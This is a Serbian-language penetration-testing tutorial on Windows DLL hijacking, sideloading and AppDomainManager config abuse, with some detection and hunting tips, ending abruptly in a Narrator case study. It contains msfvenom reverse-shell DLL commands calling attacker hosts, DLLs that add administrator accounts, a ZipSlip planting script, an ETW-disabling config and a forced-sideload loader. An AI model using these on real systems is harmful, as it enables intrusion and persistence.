# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva manipulisanje pouzdanom aplikacijom tako da učita malicious DLL. Ovaj termin obuhvata nekoliko taktika kao što su **DLL Spoofing, Injection i Side-Loading**. Uglavnom se koristi za code execution, postizanje persistence i, ređe, privilege escalation. Iako je ovde fokus na escalation, metoda hijacking-a ostaje ista bez obzira na cilj.

### Uobičajene tehnike

Za DLL hijacking koristi se nekoliko metoda, a njihova efikasnost zavisi od strategije aplikacije za učitavanje DLL-ova:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zamena legitimnog DLL-a malicious DLL-om, uz opcionalno korišćenje DLL Proxying-a radi očuvanja funkcionalnosti originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje malicious DLL-a u search path ispred legitimnog, čime se iskorišćava obrazac pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje malicious DLL-a koji aplikacija učitava, verujući da je reč o nepostojećem, ali potrebnom DLL-u.
4. **DLL Redirection**: Izmena search parametara kao što su `%PATH%` ili `.exe.manifest` / `.exe.local` fajlovi, kako bi se aplikacija usmerila ka malicious DLL-u.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a malicious ekvivalentom u WinSxS direktorijumu, što je metoda koja se često povezuje sa DLL side-loading-om.
6. **Relative Path DLL Hijacking**: Postavljanje malicious DLL-a u direktorijum pod kontrolom korisnika zajedno sa kopiranom aplikacijom, što podseća na Binary Proxy Execution tehnike.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading nije jedini način da se pouzdani **.NET Framework** proces natera da učita attacker code. Ako je ciljna izvršna datoteka **managed** aplikacija, CLR takođe proverava **application configuration file** sa nazivom izvedenim iz imena izvršne datoteke (na primer `Setup.exe.config`). Taj fajl može da definiše prilagođeni **AppDomainManager**. Ako config upućuje na assembly pod kontrolom napadača koji se nalazi pored EXE datoteke, CLR ga učitava **pre uobičajenog code path-a aplikacije** i izvršava unutar pouzdanog procesa.<sup>[[24]](#references)</sup>

Prema Microsoft-ovoj .NET Framework configuration schema, i `<appDomainManagerAssembly>` i `<appDomainManagerType>` moraju biti prisutni da bi se koristio prilagođeni manager.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalni config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimalni menadžer:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktične napomene:
- Ovo je tradecraft specifičan za **.NET Framework**. Zavisi od parsiranja CLR konfiguracije, a ne od Win32 DLL search order-a.
- Host zaista mora biti **managed EXE**. Brza provera: `sigcheck -m target.exe`, `corflags target.exe` ili provera **CLR Runtime Header**-a u PE metadata podacima.
- Naziv config fajla mora tačno odgovarati nazivu executable-a (`<binary>.config`) i obično se nalazi **pored EXE-a**.
- Ovo je korisno sa **signed Microsoft/vendor binaries**, zato što trusted EXE ostaje neizmenjen, dok se malicious managed assembly izvršava unutar istog procesa.
- Ako već imate writable installer/update directory, AppDomainManager hijacking može se koristiti kao **first stage**, nakon čega slede klasični DLL sideloading ili reflective loading za naredne stage-ove.

### AppDomainManager kao downloader + scheduled-task bootstrap

Praktičan intrusion pattern jeste uparivanje trusted managed EXE-a sa malicious `*.config` fajlom i malicious AppDomainManager DLL-om koji služi samo kao **small bootstrapper**:<sup>[[25]](#references)</sup>

1. User pokreće signed .NET installer ili updater iz uverljive lokacije, kao što je `%USERPROFILE%\Downloads`.
2. Pridruženi config navodi CLR da učita attacker assembly **pre** nego što legitimna logika aplikacije započne.
3. Malicious manager vrši **path gate** (na primer, nastavlja samo ako host EXE radi iz `Downloads` direktorijuma i dozvoljava da second stage radi samo iz `%LOCALAPPDATA%`).
4. Ako provera prođe, on preuzima pravi payload u user-writable path, kao što je `%LOCALAPPDATA%\PerfWatson2.exe`, i uspostavlja persistence pomoću scheduled task-a.

Zašto je ova varijanta važna:
- Signed host EXE ostaje neizmenjen, pa triage koji proverava samo hash glavnog binary-ja može da propusti compromise.
- Jednostavan **path-based anti-analysis** je čest: premeštanje ZIP/EXE/DLL triad-e na Desktop, Temp ili sandbox path može namerno prekinuti chain.
- First-stage AppDomainManager DLL može ostati mali i low-noise, dok se pravi implant preuzima kasnije.

Minimalni persistence primer koji se često viđa sa ovim pattern-om:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Napomene:
- ` /rl highest` znači **najviši dostupni nivo** za tog korisnika/sesiju; sam po sebi ne garantuje eskalaciju na SYSTEM.
- Ovu tehniku je često bolje klasifikovati kao **execution/persistence via .NET config abuse** nego kao klasični hijacking redosleda pretrage za nedostajući DLL, iako operatori često kombinuju oba pristupa.

Tačke za detekciju:
- Potpisani .NET izvršni fajlovi pokrenuti iz **ZIP extraction paths**, `Downloads`, `%TEMP%` ili drugih direktorijuma u koje korisnik može da upisuje, sa **colocated** `<exe>.config` fajlom.
- Novi scheduled tasks čija akcija pokazuje na `%LOCALAPPDATA%`, `%APPDATA%` ili `Downloads`, a čiji nazivi imitiraju browser/vendor updater-e.
- Kratkotrajni managed bootstrap procesi koji odmah preuzimaju drugi EXE, a zatim pokreću `schtasks.exe`.
- Uzorci koji se rano završavaju osim ako putanja izvršnog fajla ne odgovara očekivanom user-profile direktorijumu.

### Hijacking postojećeg scheduled task-a radi ponovnog pokretanja sideload lanca

Za persistence nemojte tražiti samo **kreiranje novog task-a**. Neke intrusion grupe čekaju da legitimni installer kreira **normalan updater task**, a zatim **prepišu task action** tako da postojeći naziv, autor i trigger ostanu poznati defenderima.

Ponovljivi workflow:
1. Instalirajte/pokrenite legitimni software i identifikujte task koji on obično kreira.
2. Eksportujte task XML i zabeležite trenutne vrednosti `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zamenite samo akciju tako da task pokreće vaš **trusted host EXE** iz staging direktorijuma u koji korisnik može da upisuje; taj fajl zatim radi side-load ili AppDomain-load stvarnog payload-a.
4. Ponovo registrujte isti naziv task-a umesto kreiranja novog očiglednog persistence artefakta.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Zašto je stealthier:
- Naziv taska i dalje može izgledati legitimno (na primer vendor updater).
- **Task Scheduler service** ga pokreće, pa validacija parent/ancestor procesa često vidi očekivani scheduling chain umesto `explorer.exe`.
- DFIR timovi koji traže samo **nove nazive taskova** mogu prevideti task čija je registracija već postojala, ali čija akcija sada pokazuje na `%LOCALAPPDATA%`, `%APPDATA%` ili drugu putanju pod kontrolom napadača.

Brzi hunting pivoti:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Uporedite XML datoteke `C:\Windows\System32\Tasks\*` i metadata iz `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` sa baseline-om.
- Generišite alert kada **vendor-looking updater task** izvršava fajl iz **user-writable directories** ili pokreće .NET EXE sa pridruženim `*.config` fajlom.

> [!TIP]
> Za chain korak po korak koji kombinuje HTML staging, AES-CTR configs i .NET implants sa DLL sideloading-om, pogledajte workflow ispod.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Pronalaženje DLL-ova koji nedostaju

Najčešći način da pronađete DLL-ove koji nedostaju u sistemu jeste da pokrenete [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals-a i **podesite** **sledeća 2 filtera**:

![Common Techniques - Pronalaženje DLL-ova koji nedostaju: Najčešći način da pronađete DLL-ove koji nedostaju u sistemu jeste da pokrenete procmon iz sysinternals-a i podesite sledeća 2 filtera](<../../../images/image (961).png>)

![Common Techniques - Pronalaženje DLL-ova koji nedostaju: Najčešći način da pronađete DLL-ove koji nedostaju u sistemu jeste da pokrenete procmon iz sysinternals-a i podesite sledeća 2 filtera](<../../../images/image (230).png>)

i prikažete samo **File System Activity**:

![Common Techniques - Pronalaženje DLL-ova koji nedostaju: i prikažete samo File System Activity](<../../../images/image (153).png>)

Ako tražite **DLL-ove koji generalno nedostaju**, ostavite ovo pokrenuto nekoliko **sekundi**.\
Ako tražite **DLL koji nedostaje unutar određenog executable-a**, podesite dodatni filter, kao što je **"Process Name" "contains" `<exec name>`**, pokrenite ga i zaustavite capturing events.<sup>[[9]](#references)</sup>

## Exploiting DLL-ova koji nedostaju

Da biste eskalirali privilegije, potražite **DLL koji privileged process pokušava da učita** sa lokacije u koju možete da upisujete. To se može desiti kada kontrolišete direktorijum koji se pretražuje pre direktorijuma koji sadrži legitimni DLL ili kada traženi DLL ne postoji, a možete da upisujete u jedan od pretraživanih direktorijuma.

### Redosled pretrage Dll-ova

**U okviru** [**Microsoft dokumentacije**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete pronaći kako se Dll-ovi konkretno učitavaju.**

**Windows aplikacije** traže DLL-ove prateći skup **unapred definisanih putanja pretrage**, prema određenom redosledu. Problem DLL hijacking-a nastaje kada se malicious DLL strateški postavi u jedan od ovih direktorijuma, čime se obezbeđuje da bude učitan pre autentičnog DLL-a. Rešenje za sprečavanje ovoga jeste da se obezbedi da aplikacija koristi apsolutne putanje kada upućuje na DLL-ove koji su joj potrebni.

Redosled **DLL pretrage na 32-bitnim** sistemima možete videti ispod:

1. Direktorijum iz kog je aplikacija učitana.
2. Sistemski direktorijum. Koristite funkciju [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) da biste dobili putanju ovog direktorijuma.(_C:\Windows\System32_)
3. 16-bitni sistemski direktorijum. Ne postoji funkcija koja dobavlja putanju ovog direktorijuma, ali se on pretražuje. (_C:\Windows\System_)
4. Windows direktorijum. Koristite funkciju [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) da biste dobili putanju ovog direktorijuma.
1. (_C:\Windows_)
5. Trenutni direktorijum.
6. Direktorijumi navedeni u PATH environment variable-u. Imajte na umu da ovo ne uključuje per-application path naveden registarskim ključem **App Paths**. Ključ **App Paths** se ne koristi pri izračunavanju DLL search path-a.

To je **podrazumevani** redosled pretrage sa omogućenim **SafeDllSearchMode**. Kada je on onemogućen, trenutni direktorijum se pomera na drugo mesto. Da biste onemogućili ovu funkciju, kreirajte registarsku vrednost **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je omogućena).

Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu executable module-a koji **LoadLibraryEx** učitava.

Konačno, DLL se može učitati apsolutnom putanjom umesto nazivom. U tom slučaju Windows traži sam DLL samo na toj putanji; dependencies zahtevane po nazivu i dalje prate odgovarajući redosled pretrage.

Postoje i drugi načini za izmenu redosleda pretrage, ali ih ovde neću objašnjavati.

### Chaining proizvoljnog upisivanja fajla u hijack DLL-a koji nedostaje

**Related technique:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Koristite **ProcMon** filtere (`Process Name` = target EXE, `Path` se završava na `.dll`, `Result` = `NAME NOT FOUND`) da biste prikupili nazive DLL-ova koje process proverava, ali ne može da pronađe.<sup>[[14]](#references)</sup>
2. Ako se binary pokreće po **schedule-u/service-u**, postavljanje DLL-a sa jednim od tih naziva u **application directory** (search-order entry #1) dovešće do njegovog učitavanja pri sledećem izvršavanju. U jednom slučaju sa .NET scanner-om, process je tražio `hostfxr.dll` u `C:\samples\app\` pre učitavanja prave kopije iz `C:\Program Files\dotnet\fxr\...`.
3. Napravite payload DLL (npr. reverse shell) sa bilo kojim export-om: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ako je vaš primitive **ZipSlip-style arbitrary write**, napravite ZIP čiji entry izlazi iz extraction direktorijuma tako da DLL završi u app folderu:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Isporučite arhivu u nadzirani inbox/share; kada scheduled task ponovo pokrene proces, on učitava malicious DLL i izvršava vaš kod kao service account.

### Prisiljavanje sideloading-a putem RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način za deterministički uticaj na DLL search path novokreiranog procesa jeste postavljanje polja DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa pomoću ntdll native API-ja. Navođenjem direktorijuma pod kontrolom napadača, ciljni proces koji razrešava imported DLL po imenu (bez apsolutne putanje i bez korišćenja safe loading flags) može biti prisiljen da učita malicious DLL iz tog direktorijuma.

Key idea
- Izgradite process parameters pomoću RtlCreateProcessParametersEx i navedite prilagođeni DllPath koji pokazuje na vaš kontrolisani folder (npr. direktorijum u kom se nalaze vaš dropper/unpacker).
- Kreirajte proces pomoću RtlCreateUserProcess. Kada ciljni binary razrešava DLL po imenu, loader će tokom razrešavanja proveriti ovaj navedeni DllPath, što omogućava pouzdan sideloading čak i kada se malicious DLL ne nalazi u istom direktorijumu kao ciljni EXE.

Notes/limitations
- Ovo utiče na child process koji se kreira; razlikuje se od SetDllDirectory, koji utiče samo na current process.
- Cilj mora da importuje ili da pomoću LoadLibrary učitava DLL po imenu (bez apsolutne putanje i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardkodovane apsolutne putanje ne mogu biti hijack-ovane. Forwarded exports i SxS mogu promeniti prioritet.

Minimalni C primer (ntdll, wide strings, pojednostavljeno rukovanje greškama):

<details>
<summary>Kompletan C primer: prisiljavanje DLL sideloading-a putem RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Primer operativne upotrebe
- Postavite malicious xmllite.dll (koji exportuje potrebne funkcije ili prosleđuje pozive stvarnom DLL-u) u svoj DllPath direktorijum.
- Pokrenite potpisani binary za koji je poznato da po imenu traži xmllite.dll koristeći navedenu tehniku. Loader razrešava import preko prosleđenog DllPath-a i sideloaduje vaš DLL.

Ova tehnika je primećena u stvarnim napadima kao deo multi-stage sideloading lanaca: početni launcher postavlja helper DLL, koji zatim pokreće Microsoft-signed, hijackable binary sa prilagođenim DllPath-om kako bi primorao učitavanje napadačevog DLL-a iz staging direktorijuma.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

Za mete zasnovane na **.NET Framework-u**, sideloading se može izvršiti **pre `Main()`** bez patchovanja memorije zloupotrebom susednog **`.exe.config`** fajla aplikacije. Umesto oslanjanja isključivo na redosled pretrage Win32 DLL-ova, napadač postavlja legitimni .NET EXE pored malicious config fajla i jednog ili više assembly-ja pod kontrolom napadača.

Kako lanac funkcioniše:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE se pokreće, a **CLR čita `<exe>.config`**.
2. Config postavlja **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`**, tako da runtime instancira `AppDomainManager` pod kontrolom napadača.
3. Malicious manager dobija izvršavanje **pre `Main()`** unutar trusted host procesa.
4. Isti config može primorati CLR da prvo razrešava lokalne assembly-je (na primer `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) i može oslabiti runtime validaciju/telemetriju bez inline patchovanja.

Obrazac karakterističan za kampanje (tačno ugnježđivanje može da varira u zavisnosti od direktive / CLR verzije):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Zašto je ovo korisno:
- **`<probing privatePath="."/>`** zadržava resolution assembly-ja u direktorijumu aplikacije, pretvarajući folder u predvidljivu površinu za sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** preusmeravaju izvršavanje u attacker code tokom CLR inicijalizacije, pre nego što se pokrene logika legitimne aplikacije.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** može omogućiti full-trust aplikaciji da učita unsigned ili izmenjene assembly-je bez strong-name validation greške.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** izbegava publisher-policy redirects ka novijim assembly-jima.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** čini izbor runtime-a determinističnijim.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** je posebno zanimljiv zato što **CLR iz konfiguracije isključuje sopstvenu ETW vidljivost**, umesto da implant u memoriji menja `EtwEventWrite`.

Operativni obrazac uočen u novijim kampanjama:
- Stage 1 postavlja `setup.exe`, `setup.exe.config` i lokalne assembly-je.
- Stage 2 ih kopira u uverljiv **AppData update** folder, preimenuje host u nešto poput `update.exe` i ponovo ga pokreće putem **scheduled task-a**.
- Stage 3 proverava execution context, na primer očekivani parent `svchost.exe` iz Task Scheduler-a, pre učitavanja finalnog RAT DLL/export-a.

Ideje za hunting:
- Potpisani ili na drugi način legitimni **.NET executable-i** koji se izvršavaju sa sumnjivim susednim **`.config`** fajlovima na lokacijama u koje korisnik može da upisuje.
- `.config` fajlovi koji sadrže **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ili **`etwEnable enabled="false"`**.
- Scheduled tasks koji ponovo pokreću preimenovane update binary-je iz **`%LOCALAPPDATA%`** ili app-specific `\bin\update\` direktorijuma.
- Parent/child lanci u kojima scheduled task pokreće trusted .NET host koji odmah učitava non-vendor assembly-je iz sopstvenog direktorijuma.

#### Izuzeci u redosledu pretrage DLL-a prema Windows dokumentaciji

Određeni izuzeci standardnom redosledu pretrage DLL-a navedeni su u Windows dokumentaciji:

- Kada se naiđe na **DLL koji ima isto ime kao DLL koji je već učitan u memoriji**, sistem zaobilazi uobičajenu pretragu. Umesto toga proverava redirection i manifest, a zatim kao podrazumevanu opciju koristi DLL koji je već u memoriji. **U ovom scenariju sistem ne vrši pretragu DLL-a**.
- U slučajevima kada je DLL prepoznat kao **known DLL** za trenutnu verziju Windows-a, sistem će koristiti svoju verziju known DLL-a, zajedno sa svim njegovim dependent DLL-ovima, **preskačući proces pretrage**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih known DLL-ova.
- Ako **DLL ima dependencies**, pretraga tih dependent DLL-ova sprovodi se kao da su navedeni samo svojim **module names**, bez obzira na to da li je početni DLL identifikovan putem pune putanje.

### Escalating Privileges

**Zahtevi**:

- Identifikujte proces koji radi ili će raditi sa **drugačijim privilegijama** (horizontalno ili lateralno kretanje), a kojem **nedostaje DLL**.
- Obezbedite **write access** za svaki **direktorijum** u kojem će se **DLL** pretraživati. To može biti direktorijum executable-a ili direktorijum unutar system path-a.

Ovi preduslovi po podrazumevanim vrednostima nisu uobičajeni: privilegovani executable-i obično nemaju missing DLL dependencies, a standardni korisnici obično ne mogu da upisuju u direktorijume system search path-a. Pogrešno konfigurisana okruženja ipak mogu izložiti oba uslova.\
Ako su zahtevi ispunjeni, proverite projekat [UACME](https://github.com/hfiref0x/UACME). Iako mu je glavni cilj UAC bypass, sadrži DLL-hijacking PoC-ove za određene verzije Windows-a koji se često mogu prilagoditi direktorijumu sa write access-om koji ste pronašli.

Imajte na umu da možete **proveriti svoje dozvole u folderu** pomoću:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proverite dozvole svih fascikli unutar PATH-a**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti imports izvršne datoteke i exports DLL-a pomoću:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za kompletan vodič o tome kako da **zloupotrebite DLL Hijacking za eskalaciju privilegija** sa dozvolama za pisanje u fascikli **System Path** pogledajte:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatizovani alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) proverava da li imate dozvole za pisanje u bilo kojoj fascikli unutar system PATH-a.\
Drugi zanimljivi automatizovani alati za otkrivanje ove ranjivosti jesu **PowerSploit funkcije**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Primer

Ako pronađete scenario koji je moguće iskoristiti, jedna od najvažnijih stvari za uspešno iskorišćavanje jeste da **kreirate dll koji eksportuje najmanje sve funkcije koje će izvršna datoteka uvesti iz njega**. U svakom slučaju, imajte na umu da je DLL Hijacking koristan za [**eskalaciju sa nivoa Medium Integrity na High (zaobilaženjem UAC-a)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili sa[ **High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)**.** Primer **kako da kreirate validan dll** možete pronaći u ovoj studiji o DLL hijackingu, fokusiranoj na DLL hijacking za izvršavanje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Pored toga, u **naredno**m odeljku možete pronaći neke **osnovne dll kodove** koji mogu biti korisni kao **šabloni** ili za kreiranje **dll-a sa eksportovanim funkcijama koje nisu obavezne**.

## **Kreiranje i kompajliranje DLL-ova**

### **DLL Proxifying**

U osnovi, **DLL proxy** je DLL koji može da **izvrši vaš zlonamerni kod prilikom učitavanja**, ali i da **izloži** i **radi** na način na koji se **očekuje**, tako što **prosleđuje sve pozive stvarnoj biblioteci**.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete da **navedete izvršnu datoteku i izaberete biblioteku** koju želite da proxify-ujete i **generišete proxified dll**, ili da **navedete DLL** i **generišete proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Dobijanje meterpreter-a (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreiraj korisnika (x86, nisam video x64 verziju):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Vaš sopstveni

U mnogim slučajevima, DLL koji kompajlirate mora da **eksportuje svaku funkciju koju victim proces importuje**. Ako nedostaje neki zahtevani export, binarni fajl ne može da ga razreši i exploit neće uspeti.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativni C DLL sa ulaznom tačkom niti</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studija slučaja: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe i dalje pri pokretanju proverava predvidljivi, jezički specifični localization DLL koji može biti hijacked za proizvoljno izvršavanje koda i persistence.<sup>[[7]](#references)</sup>

Ključne činjenice
- Putanja za proveru (trenutne verzije): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy putanja (starije verzije): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako na OneCore putanji postoji writable DLL pod kontrolom napadača, on se učitava i izvršava se `DllMain(DLL_PROCESS_ATTACH)`. Exports nisu potrebni.

Otkrivanje pomoću Procmon-a
- Filter: `Process Name is Narrator.exe` i `Operation is Load Image` ili `CreateFile`.
